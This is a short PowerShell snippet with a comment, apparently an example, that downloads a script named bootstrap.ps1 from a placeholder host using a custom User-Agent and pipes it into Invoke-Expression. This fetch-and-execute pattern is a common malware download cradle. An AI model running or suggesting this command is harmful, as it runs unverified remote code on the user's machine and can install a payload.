# Download a script response with a custom User-Agent and evaluate it.
curl -UserAgent "user-agent" https://example.invalid/bootstrap.ps1 | Invoke-Expression
